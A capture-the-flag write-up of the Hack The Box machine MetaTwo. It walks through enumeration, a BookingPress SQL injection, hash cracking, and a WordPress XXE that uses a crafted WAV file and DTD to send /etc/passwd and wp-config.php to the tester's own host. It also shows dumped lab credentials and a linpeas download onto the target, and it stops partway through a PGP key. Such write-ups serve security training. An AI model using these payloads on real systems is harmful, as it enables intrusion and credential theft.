# Hackthebox - MetaTwo - Linux

![MetaTwo](../.res/2022-11-10-09-45-59.png)

## Nmap

```bash
┌──(kali㉿kali)-[~]
└─$ sudo nmap -T4 -sC -O -sV -p- --min-rate=1000 10.10.11.186
[sudo] password for kali: 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-10 13:58 EST
Stats: 0:00:35 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 66.67% done; ETC: 13:59 (0:00:10 remaining)
Nmap scan report for 10.10.11.186
Host is up (0.031s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp?
| fingerprint-strings: 
|   GenericLines: 
|     220 ProFTPD Server (Debian) [::ffff:10.10.11.186]
|     Invalid command: try being more creative
|_    Invalid command: try being more creative
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 c4:b4:46:17:d2:10:2d:8f:ec:1d:c9:27:fe:cd:79:ee (RSA)
|   256 2a:ea:2f:cb:23:e8:c5:29:40:9c:ab:86:6d:cd:44:11 (ECDSA)
|_  256 fd:78:c0:b0:e2:20:16:fa:05:0d:eb:d8:3f:12:a4:ab (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-title: Did not follow redirect to http://metapress.htb/
|_http-server-header: nginx/1.18.0
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port21-TCP:V=7.92%I=7%D=11/10%Time=636D4A06%P=x86_64-pc-linux-gnu%r(Gen
SF:ericLines,8F,"220\x20ProFTPD\x20Server\x20\(Debian\)\x20\[::ffff:10\.10
SF:\.11\.186\]\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\x20cr
SF:eative\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\x20creativ
SF:e\r\n");
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=11/10%OT=21%CT=1%CU=36097%PV=Y%DS=2%DC=I%G=Y%TM=636D4A
OS:D8%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)OP
OS:S(O1=M539ST11NW7%O2=M539ST11NW7%O3=M539NNT11NW7%O4=M539ST11NW7%O5=M539ST
OS:11NW7%O6=M539ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)EC
OS:N(R=Y%DF=Y%T=40%W=FAF0%O=M539NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
OS:D=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 237.72 seconds
```

## Foothold

We change our /etc/hosts files and add this line `10.10.11.186    metapress.htb`

### Port 80

We browse to http://metapress.htb/ and get this:  
![metapress](../.res/2022-11-10-14-07-02.png)  

This seems to be a wordpress. We can run wpscan:

```bash
└─$ wpscan --url http://metapress.htb/ --enumerate       
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.18
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] It seems like you have not updated the database for some time.
[?] Do you want to update now? [Y]es [N]o, default: [N]Y
[i] Updating the Database ...
[i] Update completed.

[+] URL: http://metapress.htb/ [10.10.11.186]
[+] Started: Thu Nov 10 14:08:36 2022

Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: nginx/1.18.0
 |  - X-Powered-By: PHP/8.0.24
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: http://metapress.htb/robots.txt
 | Interesting Entries:
 |  - /wp-admin/
 |  - /wp-admin/admin-ajax.php
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://metapress.htb/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://metapress.htb/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://metapress.htb/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.6.2 identified (Insecure, released on 2021-02-22).
 | Found By: Rss Generator (Passive Detection)
 |  - http://metapress.htb/feed/, <generator>https://wordpress.org/?v=5.6.2</generator>
 |  - http://metapress.htb/comments/feed/, <generator>https://wordpress.org/?v=5.6.2</generator>

[+] WordPress theme in use: twentytwentyone
 | Location: http://metapress.htb/wp-content/themes/twentytwentyone/
 | Last Updated: 2022-11-02T00:00:00.000Z
 | Readme: http://metapress.htb/wp-content/themes/twentytwentyone/readme.txt
 | [!] The version is out of date, the latest version is 1.7
 | Style URL: http://metapress.htb/wp-content/themes/twentytwentyone/style.css?ver=1.1
 | Style Name: Twenty Twenty-One
 | Style URI: https://wordpress.org/themes/twentytwentyone/
 | Description: Twenty Twenty-One is a blank canvas for your ideas and it makes the block editor your best brush. Wi...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 | Confirmed By: Css Style In 404 Page (Passive Detection)
 |
 | Version: 1.1 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://metapress.htb/wp-content/themes/twentytwentyone/style.css?ver=1.1, Match: 'Version: 1.1'

[+] Enumerating Vulnerable Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Vulnerable Themes (via Passive and Aggressive Methods)
 Checking Known Locations - Time: 00:00:05 <=============================================================================================================================================================> (477 / 477) 100.00% Time: 00:00:05
[+] Checking Theme Versions (via Passive and Aggressive Methods)

[i] No themes Found.

[+] Enumerating Timthumbs (via Passive and Aggressive Methods)
 Checking Known Locations - Time: 00:00:18 <===========================================================================================================================================================> (2575 / 2575) 100.00% Time: 00:00:18

[i] No Timthumbs Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:01 <==============================================================================================================================================================> (137 / 137) 100.00% Time: 00:00:01

[i] No Config Backups Found.

[+] Enumerating DB Exports (via Passive and Aggressive Methods)
 Checking DB Exports - Time: 00:00:00 <====================================================================================================================================================================> (71 / 71) 100.00% Time: 00:00:00

[i] No DB Exports Found.

[+] Enumerating Medias (via Passive and Aggressive Methods) (Permalink setting must be set to "Plain" for those to be detected)
 Brute Forcing Attachment IDs - Time: 00:00:01 <=========================================================================================================================================================> (100 / 100) 100.00% Time: 00:00:01

[i] No Medias Found.

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <===============================================================================================================================================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] admin
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://metapress.htb/wp-json/wp/v2/users/?per_page=100&page=1
 |  Rss Generator (Aggressive Detection)
 |  Author Sitemap (Aggressive Detection)
 |   - http://metapress.htb/wp-sitemap-users-1.xml
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] manager
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Thu Nov 10 14:09:10 2022
[+] Requests Done: 3425
[+] Cached Requests: 10
[+] Data Sent: 1.057 MB
[+] Data Received: 17.295 MB
[+] Memory used: 298.242 MB
[+] Elapsed time: 00:00:33

```

- We tried to make a wordlist with cewl from the website but the bruteforce did not work with it so we lauched the bruteforce with rockyou.txt on the 2 found users admin and manager.
- Bruteforce does not seem to be the way though

### CVE 2022 0739

- Navigating around in the website we find a booking press plugin
- CVEs associated with it 
  - `CVE-2022-0739`
  - Interesting article [here](https://blog.sonarsource.com/wordpress-xxe-security-vulnerability/)
    - This does not work
- This [PoC](https://github.com/destr4ct/CVE-2022-0739) for CVE 2022-0739 works  
![CVE 2022 0739](../.res/2022-12-19-09-27-31.png)  

```
|admin|admin@metapress.htb|$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.|
|manager|manager@metapress.htb|$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70|
```

> Note: the nonce is a number used once. It is a security token. You can read more about it [here](https://www.hostinger.com/tutorials/wordpress-nonce).  
> You will need to find yours. I recommend that you intercept traffic with burp and check your nonce this way.

- We now need to crack the hashes. Wordpress hashes are stored in md5. We can do it with hashcat `hashcat -O -m 400 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt`
- We get the password for manager `$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70:partylikearockstar`
- Let's connect using it. We do not have much access with this user. Let's check for password reuse.
- Password does not work on ftp 
- Does not work on ssh either

### CVE 2021 29447

- When analyzing wpscan we had a vulnerability that seemed interesting `CVE-2021-29447` for our version of wordpress 5.6.2. This [article](https://blog.wpsec.com/wordpress-xxe-in-media-library-cve-2021-29447/) explains it well.
- Using this trick we can read files from the server.
- Here is how I did it in my context

1. I created the wav file `echo -en 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM '"'"'http://10.10.14.4/evil.dtd'"'"'>%remote;%init;%trick;] >\x00'> malicious.wav`

2. I created the evil.dtd file. Here is what it contains

```xml
<!ENTITY % file SYSTEM "php://filter/zlib.deflate/read=convert.base64-encode/resource=/etc/passwd">
<!ENTITY % init "<!ENTITY &#37; trick SYSTEM 'http://10.10.14.4/?p=%file;'>" >
```

3. I created a decode.php file

```php
<?php
echo zlib_decode(base64_decode('STRING-TO-DECODE-HERE'));
?>
```

4. I launched the php server `php -S 0.0.0.0:80`

5. I uploaded my wav file in the media library  

![upload wav](../.res/2022-12-19-10-55-49.png)

6. I copied the string from the request sent to my server

![string](../.res/2022-12-19-11-04-02.png)  

7. I put it in my php file and went to `http://10.10.14.4/decode.php` and got the /etc/passwd file we requested.

![file decoded /etc/passwd](../.res/2022-12-19-11-05-51.png)

```bash
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System
(admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd
Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd
Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:109::/nonexistent:/usr/sbin/nologin
sshd:x:104:65534::/run/sshd:/usr/sbin/nologin
jnelson:x:1000:1000:jnelson,,,:/home/jnelson:/bin/bash
systemd-timesync:x:999:999:systemd Time Synchronization:/:/usr/sbin/nologin
systemd-coredump:x:998:998:systemd Core Dumper:/:/usr/sbin/nologin
mysql:x:105:111:MySQL Server,,,:/nonexistent:/bin/false
proftpd:x:106:65534::/run/proftpd:/usr/sbin/nologin
ftp:x:107:65534::/srv/ftp:/usr/sbin/nologin
```

- So we have a jnelson user
- Let's try to find other interesting files. [Here](https://gist.github.com/SleepyLctl/63a2da730a3d5abce5013f0f510b1fe2) is a list

- PHP version `PHP/8.0.24`
- `Debian GNU/Linux 11 \n \l`
- `nginx/1.18.0`

- Here is the `/etc/ssh/ssh_config` file

```bash
# This is the ssh client system-wide configuration file. See 
# ssh_config(5) for more information. This file provides defaults for # users, and the values can be changed in per-user configuration files # or on the command line. 
# Configuration data is parsed as follows: 
# 1. command line options 
# 2. user-specific file 
# 3. system-wide file 
# Any configuration value is only changed the first time it is set. 
# Thus, host-specific definitions should be at the beginning of the 
# configuration file, and defaults at the end. 
# Site-wide defaults for some commonly used options. For a comprehensive 
# list of available options, their meanings and defaults, please see the 
# ssh_config(5) man page. Include /etc/ssh/ssh_config.d/*.conf Host * 
# ForwardAgent no 
# ForwardX11 no 
# ForwardX11Trusted yes 
# PasswordAuthentication yes 
# HostbasedAuthentication no 
# GSSAPIAuthentication no 
# GSSAPIDelegateCredentials no 
# GSSAPIKeyExchange no 
# GSSAPITrustDNS no 
# BatchMode no 
# CheckHostIP yes 
# AddressFamily any 
# ConnectTimeout 0 
# StrictHostKeyChecking ask 
# IdentityFile ~/.ssh/id_rsa 
# IdentityFile ~/.ssh/id_dsa 
# IdentityFile ~/.ssh/id_ecdsa 
# IdentityFile ~/.ssh/id_ed25519 
# Port 22 
# Ciphers aes128-ctr,aes192-ctr,aes256-ctr,aes128-cbc,3des-cbc 
# MACs hmac-md5,hmac-sha1,umac-64@openssh.com 
# EscapeChar ~ 
# Tunnel no 
# TunnelDevice any:any 
# PermitLocalCommand no 
# VisualHostKey no 
# ProxyCommand ssh -q -W %h:%p gateway.example.com 
# RekeyLimit 1G 1h 
# UserKnownHostsFile ~/.ssh/known_hosts.d/%k SendEnv LANG LC_* HashKnownHosts yes GSSAPIAuthentication yes
```

- file /proc/version

```bash
Linux version 5.10.0-19-amd64 (debian-kernel@lists.debian.org) (gcc-10 (Debian 10.2.1-6) 10.2.1 20210110, GNU ld (GNU Binutils for Debian) 2.35.2) #1 SMP Debian 5.10.149-2 (2022-10-21) 
```

- file /etc/nginx/nginx.conf

```bash
user www-data; 
worker_processes auto; 
pid /run/nginx.pid; 
include /etc/nginx/modules-enabled/*.conf; 
events { 
worker_connections 768; # multi_accept on; 
} 
http 
{ 
## # Basic Settings ## sendfile on; 
tcp_nopush on; 
types_hash_max_size 2048; 
# server_tokens off; 
# server_names_hash_bucket_size 64; 
# server_name_in_redirect off; 
include /etc/nginx/mime.types; 
default_type application/octet-stream; 
## # SSL Settings 
## ssl_protocols TLSv1 TLSv1.1 TLSv1.2 TLSv1.3; 
# Dropping SSLv3, ref: POODLE ssl_prefer_server_ciphers on; 
## # Logging Settings 
## access_log /var/log/nginx/access.log; 
error_log /var/log/nginx/error.log; 
## # Gzip Settings 
## gzip on; 
# gzip_vary on; 
# gzip_proxied any; 
# gzip_comp_level 6; 
# gzip_buffers 16 8k; 
# gzip_http_version 1.1; 
# gzip_types text/plain text/css application/json application/javascript text/xml application/xml application/xml+rss text/javascript; 
## # Virtual Host Configs 
## include /etc/nginx/conf.d/*.conf; include /etc/nginx/sites-enabled/*; 
} 
#mail 
{ 
# # See sample authentication script at: 
# # http://wiki.nginx.org/ImapAuthenticateWithApachePhpScript 
# # # auth_http localhost/auth.php; 
# # pop3_capabilities "TOP" "USER"; 
# # imap_capabilities "IMAP4rev1" "UIDPLUS"; 
# # server { # listen localhost:110; 
# protocol pop3; # proxy on; 
# 
} 
# # server 
{ 
# listen localhost:143; 
# protocol imap; 
# proxy on; # 
} 
#}
```

- File /hom/jnelson/.profile

```
# ~/.profile: executed by the command interpreter for login shells. 
# This file is not read by bash(1), if ~/.bash_profile or ~/.bash_login 
# exists. 
# see /usr/share/doc/bash/examples/startup-files for examples. 
# the files are located in the bash-doc package. 
# the default umask is set in /etc/profile; for setting the umask # for ssh logins, install and configure the libpam-umask package. 
#umask 022 
# if running bash if [ -n "$BASH_VERSION" ]; then 
# include .bashrc if it exists if [ -f "$HOME/.bashrc" ]; then . "$HOME/.bashrc" fi fi 
# set PATH so it includes user's private bin if it exists if [ -d "$HOME/bin" ] ; then PATH="$HOME/bin:$PATH" fi 
# set PATH so it includes user's private bin if it exists if [ -d "$HOME/.local/bin" ] ; then PATH="$HOME/.local/bin:$PATH" fi 
```

- It is also worth checking this [website](https://wiki.debian.org/Nginx/DirectoryStructure) to learn more about nginx and its configuration files
- It also seems like we have a way to tell if a directory exists.
  - If it does not exist the server gives this output
  ![not-exist](../.res/2022-12-21-10-16-20.png)  
  - If it does we get this output
  ![exist](../.res/2022-12-21-10-17-03.png)  
- Using this methodology and the fingerprinting from web server responses and nmap we could find out that the following folders exist  
  - `/etc/php/8.0/` 
  - `/var/www/` (there are no folder log, logs, html, metapress inside)
  - `/var/www/metapress.htb/`
  - `/etc/nginx/sites-available/`
  - `/etc/nginx/modules-enabled/`
  - `/etc/proftpd/`
  - `/usr/local/etc/`
  - `/etc/nginx/`
  - `/etc/nginx/conf.d`
  - `/home/jnelson/` (there are no folder .ssh in )
  - `/usr/sbin/`
  - `/var/lib/`
  - `/var/lib/mysql/`
  - `/var/local/`
  - `/var/log/`
  - `/var/log/dpkg.log` (its a file that exists but its empty)
  - `/var/log/proftpd` (its a file that exists but its empty)
  - `/var/spool/`
  - `/var/spool/cron/`
  - `/srv/`

### WP Config file

- I really want to find the wp-config.php. Ok so turns out that the absolute path `/var/www/metapress.htb/` did not work what worked was a relative path `../wp-config.php`. It looks like that it is because I was missing a part of the absolute path `/var/www/metapress.htb/blog/wp-config.php`
- For some reason with the slib the file was truncated so my evil.dtd file looks like this

```xml
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=../wp-config.php">
<!ENTITY % init "<!ENTITY &#37; trick SYSTEM 'http://10.10.14.4/?p=%file;'>" >
```

- To decode the base64 we can also use bash as follow:
```
echo -n 'BASE64-STRING-HERE' | base64 --decode
```

- And here is the wp-config.php file

```php
<?php
/** The name of the database for WordPress */
define( 'DB_NAME', 'blog' );

/** MySQL database username */
define( 'DB_USER', 'blog' );

/** MySQL database password */
define( 'DB_PASSWORD', '635Aq@TdqrCwXFUZ' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8mb4' );

/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

define( 'FS_METHOD', 'ftpext' );
define( 'FTP_USER', 'metapress.htb' );
define( 'FTP_PASS', '9NYS_ii@FyL_p5M2NvJ' );
define( 'FTP_HOST', 'ftp.metapress.htb' );
define( 'FTP_BASE', 'blog/' );
define( 'FTP_SSL', false );

/**#@+
 * Authentication Unique Keys and Salts.
 * @since 2.6.0
 */
define( 'AUTH_KEY',         '?!Z$uGO*A6xOE5x,pweP4i*z;m`|.Z:X@)QRQFXkCRyl7}`rXVG=3 n>+3m?.B/:' );
define( 'SECURE_AUTH_KEY',  'x$i$)b0]b1cup;47`YVua/JHq%*8UA6g]0bwoEW:91EZ9h]rWlVq%IQ66pf{=]a%' );
define( 'LOGGED_IN_KEY',    'J+mxCaP4z<g.6P^t`ziv>dd}EEi%48%JnRq^2MjFiitn#&n+HXv]||E+F~C{qKXy' );
define( 'NONCE_KEY',        'SmeDr$$O0ji;^9]*`~GNe!pX@DvWb4m9Ed=Dd(.r-q{^z(F?)7mxNUg986tQO7O5' );
define( 'AUTH_SALT',        '[;TBgc/,M#)d5f[H*tg50ifT?Zv.5Wx=`l@v$-vH*<~:0]s}d<&M;.,x0z~R>3!D' );
define( 'SECURE_AUTH_SALT', '>`VAs6!G955dJs?$O4zm`.Q;amjW^uJrk_1-dI(SjROdW[S&~omiH^jVC?2-I?I.' );
define( 'LOGGED_IN_SALT',   '4[fS^3!=%?HIopMpkgYboy8-jl^i]Mw}Y d~N=&^JsI`M)FJTJEVI) N#NOidIf=' );
define( 'NONCE_SALT',       '.sU&CQ@IRlh O;5aslY+Fq8QWheSNxd6Ve#}w!Bq,h}V9jKSkTGsv%Y451F8L=bL' );

/**
 * WordPress Database Table prefix.
 */
$table_prefix = 'wp_';

/**
 * For developers: WordPress debugging mode.
 * @link https://wordpress.org/support/article/debugging-in-wordpress/
 */
define( 'WP_DEBUG', false );

/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
        define( 'ABSPATH', __DIR__ . '/' );
}

/** Sets up WordPress vars and included files. */
require_once ABSPATH . 'wp-settings.php';
```

### FTP

So we have the creds for the FTP server lets login there `ftp -p 10.10.11.186`  
User is metapress.htb and password is `9NYS_ii@FyL_p5M2NvJ`  
If we look around we have the wordress folder but not really inresting. There is a mailer folder though that looks interesting. The SECURITY.md is not really interesting but there is also a php script that looks juicy.

```php
<?php
/*
 * This script will be used to send an email to all our users when ready for launch
*/

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

require 'PHPMailer/src/Exception.php';
require 'PHPMailer/src/PHPMailer.php';
require 'PHPMailer/src/SMTP.php';

$mail = new PHPMailer(true);

$mail->SMTPDebug = 3;                               
$mail->isSMTP();            

$mail->Host = "mail.metapress.htb";
$mail->SMTPAuth = true;                          
$mail->Username = "jnelson@metapress.htb";                 
$mail->Password = "Cb4_JmWM8zUZWMu@Ys";                           
$mail->SMTPSecure = "tls";                           
$mail->Port = 587;                                   

$mail->From = "jnelson@metapress.htb";
$mail->FromName = "James Nelson";

$mail->addAddress("info@metapress.htb");

$mail->isHTML(true);

$mail->Subject = "Startup";
$mail->Body = "<i>We just started our new blog metapress.htb!</i>";

try {
    $mail->send();
    echo "Message has been sent successfully";
} catch (Exception $e) {
    echo "Mailer Error: " . $mail->ErrorInfo;
}
```

- We get another password this way. Let's try it on ssh as we know the user jnelson is here because we found their home folder previously

### SSH

- `ssh jnelson@metapress.htb` the password is `Cb4_JmWM8zUZWMu@Ys`
- We can grab the user flag.

## Privilege escalation

- Let's take linpeas right away and enumerate automatically `wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas_linux_amd64`
- `python3 -m http.server 80`
- And in our target `wget http://10.10.14.4/linpeas_linux_amd64`
- There were private ssh keys but I would not have guessed the path of the folder when trying to foothold `/home/jnelson/.passpie/.keys`
- Apparently passpie is password manager. We can get more info about it [here](https://github.com/marcwebbie/passpie)
- Interesting output from linepeas to analyze further

```bash
passwd file: /etc/pam.d/passwd                                                                                                                                                                                                               
passwd file: /etc/passwd
passwd file: /usr/share/lintian/overrides/passwd
╔══════════╣ Unexpected in root
/initrd.img.old                                                                                                                                                                                                                              
/initrd.img
/vmlinuz
/vmlinuz.old
/.bash_history
/home/jnelson/user.txt
/home/jnelson/.bash_history
/home/jnelson/.gnupg/pubring.kbx
/home/jnelson/.gnupg/trustdb.gpg

```

- There is are interesting files in jnelson
![root pass in passpie](../.res/2022-12-21-17-04-35.png)
- Here is the output of root.pass

```bash
comment: ''
fullname: root@ssh
login: root
modified: 2022-06-26 08:58:15.621572
name: ssh
password: '-----BEGIN PGP MESSAGE-----


  hQEOA6I+wl+LXYMaEAP/T8AlYP9z05SEST+Wjz7+IB92uDPM1RktAsVoBtd3jhr2

  nAfK00HJ/hMzSrm4hDd8JyoLZsEGYphvuKBfLUFSxFY2rjW0R3ggZoaI1lwiy/Km

  yG2DF3W+jy8qdzqhIK/15zX5RUOA5MGmRjuxdco/0xWvmfzwRq9HgDxOJ7q1J2ED

  /2GI+i+Gl+Hp4LKHLv5mMmH5TZyKbgbOL6TtKfwyxRcZk8K2xl96c3ZGknZ4a0Gf

  iMuXooTuFeyHd9aRnNHRV9AQB2Vlg8agp3tbUV+8y7szGHkEqFghOU18TeEDfdRg

  krndoGVhaMNm1OFek5i1bSsET/L4p4yqIwNODldTh7iB0ksB/8PHPURMNuGqmeKw

  mboS7xLImNIVyRLwV80T0HQ+LegRXn1jNnx6XIjOZRo08kiqzV2NaGGlpOlNr3Sr

  lpF0RatbxQGWBks5F3o=

  =uh1B

  -----END PGP MESSAGE-----

  '
```

- The file .keys also seems interesting

```bash
-----BEGIN PGP PUBLIC KEY BLOCK-----

mQSuBGK4V9YRDADENdPyGOxVM7hcLSHfXg+21dENGedjYV1gf9cZabjq6v440NA1
AiJBBC1QUbIHmaBrxngkbu/DD0gzCEWEr2pFusr/Y3yY4codzmteOW6Rg2URmxMD
/GYn9FIjUAWqnfdnttBbvBjseL4sECpmgxTIjKbWAXlqgEgNjXD306IweEy2FOho
3LpAXxfk8C/qUCKcpxaz0G2k0do4+VTKZ+5UDpqM5++soJqhCrUYudb9zyVyXTpT
ZjMvyXe5NeC7JhBCKh+/Wqc4xyBcwhDdW+WU54vuFUthn+PUubEN1m+s13BkyvHV
gNAM4v6terRItXdKvgvHtJxE0vhlNSjFAedACHC4sN+dRqFu4li8XPIVYGkuK9pX
5xA6Nj+8UYRoZrP4SYtaDslT63ZaLd2MvwP+xMw2XEv8Uj3TGq6BIVWmajbsqkEp
tQkU7d+nPt1aw2sA265vrIzry02NAhxL9YQGNJmXFbZ0p8cT3CswedP8XONmVdxb
a1UfdG+soO3jtQsBAKbYl2yF/+D81v+42827iqO6gqoxHbc/0epLqJ+Lbl8hC/sG
WIVdy+jynHb81B3FIHT832OVi2hTCT6vhfTILFklLMxvirM6AaEPFhxIuRboiEQw
8lQMVtA1l+Et9FXS1u91h5ZL5PoCfhqpjbFD/VcC5I2MhwL7n50ozVxkW2wGAPfh
cODmYrGiXf8dle3z9wg9ltx25XLsVjoR+VLm5Vji85konRVuZ7TKnL5oXVgdaTML
qIGqKLQfhHwTdvtYOTtcxW3tIdI16YhezeoUioBWY1QM5z84F92UVz6aRzSDbc/j
FJOmNTe7+ShRRAAPu2qQn1xXexGXY2BFqAuhzFpO/dSidv7/UH2+x33XIUX1bPXH
FqSg+11VAfq3bgyBC1bXlsOyS2J6xRp31q8wJzUSlidodtNZL6APqwrYNhfcBEuE
PnItMPJS2j0DG2V8IAgFnsOgelh9ILU/OfCA4pD4f8QsB3eeUbUt90gmUa8wG7uM
FKZv0I+r9CBwjTK3bg/rFOo+DJKkN3hAfkARgU77ptuTJEYsfmho84ZaR3KSpX4L
/244aRzuaTW75hrZCJ4RxWxh8vGw0+/kPVDyrDc0XNv6iLIMt6zJGddVfRsFmE3Y
q2wOX/RzICWMbdreuQPuF0CkcvvHMeZX99Z3pEzUeuPu42E6JUj9DTYO8QJRDFr+
F2mStGpiqEOOvVmjHxHAduJpIgpcF8z18AosOswa8ryKg3CS2xQGkK84UliwuPUh
S8wCQQxveke5/IjbgE6GQOlzhpMUwzih7+15hEJVFdNZnbEC9K/ATYC/kbJSrbQM
RfcJUrnjPpDFgF6sXQJuNuPdowc36zjE7oIiD69ixGR5UjhvVy6yFlESuFzrwyeu
TDl0UOR6wikHa7tF/pekX317ZcRbWGOVr3BXYiFPTuXYBiX4+VG1fM5j3DCIho20
oFbEfVwnsTP6xxG2sJw48Fd+mKSMtYLDH004SoiSeQ8kTxNJeLxMiU8yaNX8Mwn4
V9fOIdsfks7Bv8uJP/lnKcteZjqgBnXPN6ESGjG1cbVfDsmVacVYL6bD4zn6ZN/n
WLQzUGFzc3BpZSAoQXV0by1nZW5lcmF0ZWQgYnkgUGFzc3BpZSkgPHBhc3NwaWVA
bG9jYWw+iJAEExEIADgWIQR8Z4anVhvIT1BIZx44d3XDV0XSAwUCYrhX1gIbIwUL
CQgHAgYVCgkICwIEFgIDAQIeAQIXgAAKCRA4d3XDV0XSA0RUAP91ekt2ndlvXNX6
utvl+03LgmilpA5OHqmpRWd24UhVSAD+KiO8l4wV2VOPkXfoGSqe+1DRXanAsoRp
dRqQCcshEQ25AQ0EYrhX1hAEAIQaf8Vj0R+p/jy18CX9Di/Jlxgum4doFHkTtpqR
